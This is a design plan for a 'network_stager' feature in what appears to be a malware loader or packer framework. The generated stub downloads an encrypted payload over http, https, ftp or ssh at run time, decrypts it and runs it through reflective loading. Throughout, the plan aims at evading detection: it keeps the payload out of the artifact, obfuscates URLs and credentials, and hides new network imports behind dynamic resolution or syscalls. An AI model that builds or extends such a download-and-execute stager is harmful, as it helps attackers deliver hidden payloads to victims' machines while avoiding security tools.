# Network stager (`network_stager`)

Status: **plan — not implemented.**

A runtime network stager: instead of embedding every payload into the generated
stub (encrypted with XChaCha20-Poly1305 and decrypted in-process), the stub
fetches the payload at run time over the network, optionally decrypts it, and
then runs it with the usual execution techniques.

## 1. Goal

- Fetch a payload **at run time**, not at build time, so the payload bytes never
  ship inside the artifact (smaller stub, no embedded-ciphertext signature, and
  the operator can rotate the payload without rebuilding).
- Express it as a **`runtime:` technique step** (a `Category::Control` step),
  so it composes with the existing `on_success`/`on_fail`/`delay_ms` gating and
  chains with the execution techniques.
- Support several transports (`http`, `https`, `ftp`, `ssh`) and an optional
  encryption layer for the bytes on the wire.
- Reuse the existing crypto, string-obfuscation, args and runner machinery
  rather than reimplementing any of it.

## 2. Why a technique, not a `build.payloads.<name>.source` change

Today `build.payloads.<name>.source` is resolved by the **packer** at build time:
`http(s)://` is fetched in memory, `file://` is read from disk, and the result is
embedded as ciphertext (`include_bytes!` + `decrypt_step` in the runner — see
`src/engine/steps.rs::render_execution_block`). A stager moves that fetch to the
**stub** at run time, which is a different thing and belongs in the ordered
`runtime:` list next to the step that consumes the result.

## 3. Shape

A Control step that produces the bytes for a named payload, stored where the next
Execution step can read them:

```yaml
runtime:
  - technique: network_stager
    params:
      payload: implant            # the payload name this fetches (build.payloads.implant)
      method: https               # https | http | ftp | ssh
      url: "https://example.invalid/implant.bin"
      crypto: xchacha20poly1305   # none | xchacha20poly1305
      key: <hex 32 bytes>         # only when crypto != none
      nonce: <hex 24 bytes>       # only when crypto != none
      timeout_ms: 30000
      user_agent: "Mozilla/5.0"
    on_fail: stop
  - technique: reflective_loading
    params:
      payload: implant
```

The stager runs first and fills the `implant` slot; the `reflective_loading` step
then runs the fetched (and decrypted) bytes exactly as it would an embedded
payload.

## 4. How it plugs into the runner

The runner (`$STEP_RUNNER_BODY$`) currently, per Execution step, does:

```rust
let enc: &[u8] = include_bytes!("payload_N.bin");
let mut image = decrypt_step(enc, NONCE, KEY, LEN)?;
step_N::payload(&mut image)
```

For a **staged** payload there is no `payload_N.bin` and no `include_bytes!`.
The proposal is a small, local change to `render_execution_block`:

```rust
let mut image = crate::take_staged_payload("implant")?;   // filled by the stager
step_N::payload(&mut image)
```

`take_staged_payload` reads a process-global slot (a `OnceLock<Vec<u8>>` or the
existing static-slot pattern already used by the syscall layer for
`stack_spoofing`) that the `network_stager` step populated. No other part of the
runner changes.

## 5. Params (schema)

`TechniqueKind::NetworkStager { params: network_stager::Params }`, with:

| field | type | default | notes |
| --- | --- | --- | --- |
| `payload` | `String` | *(required)* | name in `build.payloads` this step stages; must exist and be consumed by a later Execution step |
| `method` | enum `http\|https\|ftp\|ssh` | `https` | transport |
| `url` | `String` | *(required)* | full URL; `method` is derived from the scheme unless given |
| `crypto` | enum `none\|xchacha20poly1305` | `none` | whether the fetched blob is encrypted |
| `key` / `nonce` | hex strings | *(derived)* | only when `crypto != none`; defaults to the payload's own key/nonce |
| `auth_user` / `auth_pass` | `Option<String>` | `None` | basic auth (http/ftp) or username/password (ssh) |
| `timeout_ms` | `u32` | `30000` | connect/read timeout |
| `user_agent` | `String` | a plausible UA | http(s) only |
| `retries` | `u32` | `0` | retry count on transient failure |

All string params are obfuscated through `StringsConfig` (URL, host, credentials,
user-agent), like every other technique's runtime literals.

## 6. Transports and reuse

Each method renders a client into a shared `$STAGER_BLOCK$` (one block, not
per-step), mirroring how `$SYSCALLS_BLOCK$` / `$ARGS_BLOCK$` are emitted from the
union of the active techniques' needs.

- **`https` / `http`** — reuse the `windows` crate with the
  `Win32_Networking_WinHttp` feature (or `WinInet`). Both are Win32 entry points
  like `LoadLibraryA`/`CreateProcessA` today, so they stay out of the syscall
  layer for the MVP. Header/user-agent/auth are `StringsConfig`-obfuscated.
- **`ftp`** — WinInet `InternetOpen`/`FtpGetFile` (into a heap buffer, or a
  temp file then read). Same obfuscation rules.
- **`ssh`** — the hard one. There is no Windows SSH client API. Two options,
  parked as an open question:
  1. subprocess `ssh`/`scp` (aligns with the "Rust first, not Rust only" rule and
     the `yara` subprocess precedent), or
  2. a minimal SFTP/SSH client in Rust (large; effectively its own workstream).
  Recommend shipping http(s)/ftp in the MVP and treating `ssh` as a later phase.

## 7. Crypto reuse

When `crypto: xchacha20poly1305`, the stager decrypts the fetched blob with the
**same** `chacha20poly1305` + `hex` helpers already emitted as `decrypt_step`
(`src/engine/steps.rs::STUB_HELPERS`). The key/nonce are either the payload's own
(baked like an embedded payload) or, like `examples/stubs/runtime-key.rs`, pulled
from a `$arg.N$` build argument so no key material is baked into the artifact.

## 8. Reuse map (what is NOT reimplemented)

- **Crypto**: `chacha20poly1305` / `hex`, the existing `decrypt_step` helper.
- **Obfuscation**: `StringsConfig::obfuscate` for every runtime literal.
- **Args / runtime config**: `$ARGS_BLOCK$` + `$arg.N$` for URL/credentials.
- **Gating**: the standard `StepControl` (`on_success`/`on_fail`/`delay_ms`).
- **Runner**: only `render_execution_block`'s fetch-and-decrypt line changes.
- **Payload pinning**: reuse `plan::steps::resolve`'s named-payload resolution.
- **Scheme detection**: mirror `src/engine/fetch.rs`'s scheme parsing (build-time
  already distinguishes `http(s)`/`file`/`ftp`; the stub mirrors it at run time).

## 9. Validation rules (`plan::validate`)

- `params.payload` must name an existing `build.payloads` entry, and that entry
  must be marked staged (see below) — not also embedded.
- The stager must precede the Execution step that consumes `payload` (or, more
  simply, a staged payload must be consumed by exactly one Execution step).
- `crypto: xchacha20poly1305` requires `key`/`nonce` (or a resolvable source).
- `ssh` may be rejected as `Unimplemented` until the transport exists.
- The existing terminal-step rule still applies (a staged `reflective_loading`
  of a PE executable remains terminal).

## 10. Open design decisions (to settle at implementation time)

1. **How is a payload marked "staged"?** Either a `build.payloads.<name>.staged:
   true` flag (the `source` stays for build-time fallback) or a dedicated
   `source: "stage://..."` scheme. Recommend `staged: true` (smaller schema
   delta, and keeps `source` for the embedded path).
2. **Slot ownership.** One global slot (`OnceLock<Vec<u8>>`) vs. a
   `Vec<Option<Vec<u8>>>` keyed by payload name. Recommend the latter only if a
   plan can stage multiple distinct payloads; otherwise keep one slot and
   validate "at most one stager per runtime".
3. **`ssh` scope.** Subprocess vs. in-Rust client (see §6).

## 11. Phases

- **M0 — schema + registry.** `TechniqueKind::NetworkStager`, `Params`, `DEF`
  (category `Control`, ATT&CK T1105/T1071), validation skeleton. No fragment yet;
  `Stability::Unimplemented` until a transport lands.
- **M1 — `https` + runner wiring.** `$STAGER_BLOCK$` with the WinHTTP fetch, the
  staged-payload slot, and the `render_execution_block` change; `crypto: none`
  first. Verify end to end on a loopback/self-hosted URL.
- **M2 — crypto.** Wire `xchacha20poly1305` decrypt of the fetched blob, reusing
  `decrypt_step`; key/nonce from the payload or `$arg.N$`.
- **M3 — `http` + `ftp`.** WinInet variants; auth; retries/timeouts.
- **M4 — `ssh`.** Decide subprocess vs. client; likely its own workstream.
- **M5 — wizard + docs.** Add a wizard prompt for `network_stager`; measure in
  `docs/measurements.md`; flip to `Experimental`.

## 12. Risks

- **WinHTTP/WinInet imports** are new static signatures (currently the stub
  keeps networking out); mitigate with dynamic resolution or the syscall layer
  later. Document the IAT delta in `docs/measurements.md`.
- **`ssh` is disproportionate** — flag it clearly so it does not block M0–M3.
- **A staged payload cannot be verified at build time** (nothing to inspect), so
  `build.payloads.<name>.sha256` becomes a *runtime* check the stager performs
  after fetching.
- **One slot, one consumer** — a plan that stages twice must be rejected early.

## 13. References

- `src/engine/steps.rs` — `render_execution_block`, `STUB_HELPERS` (`decrypt_step`).
- `src/engine/fetch.rs` — build-time URL scheme handling to mirror.
- `src/techniques/` — technique registry + `Category::Control`.
- `src/plan/schema.rs` — `PayloadPlan`, `CryptoPlan`, `StepControl`.
- `examples/stubs/runtime-key.rs` — runtime key material via `$arg.N$`.
